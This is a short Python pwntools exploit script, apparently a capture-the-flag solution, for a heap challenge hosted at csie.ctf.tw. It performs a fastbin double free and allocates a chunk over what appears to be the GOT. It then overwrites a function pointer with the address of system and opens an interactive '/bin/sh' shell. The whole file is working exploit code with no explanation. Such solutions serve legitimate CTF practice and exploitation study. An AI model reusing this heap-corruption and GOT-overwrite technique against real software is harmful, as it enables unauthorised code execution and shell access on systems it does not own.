from pwn import *
import sys
context.arch = 'amd64'

print sys.argv
if len(sys.argv) == 2 and sys.argv[1] == 'remote':
    r = remote('csie.ctf.tw',10142)
else:
    r = remote('localhost',8888)
#r.interactive()
def allocate(size,data):
    r.sendline('1')
    r.recvuntil('Size')
    r.send(str(size))
    r.recvuntil('Data')
    r.send(data)
def free(idx):
    r.sendline('2')
    r.recvuntil('Index')
    r.sendline(str(idx))

allocate(0x50, 'A'*8) #0
allocate(0x50, 'B'*8) #1
free(0)
free(1)
free(0)
allocate(0x50,p64(0x601ffa)) #2 
allocate(0x50, '/bin/sh\0')  #3
allocate(0x50, 'B'*8)       #4
system = 0x4007d0 
allocate(0x50, 'x'*14 + p64(system)) 

r.interactive()
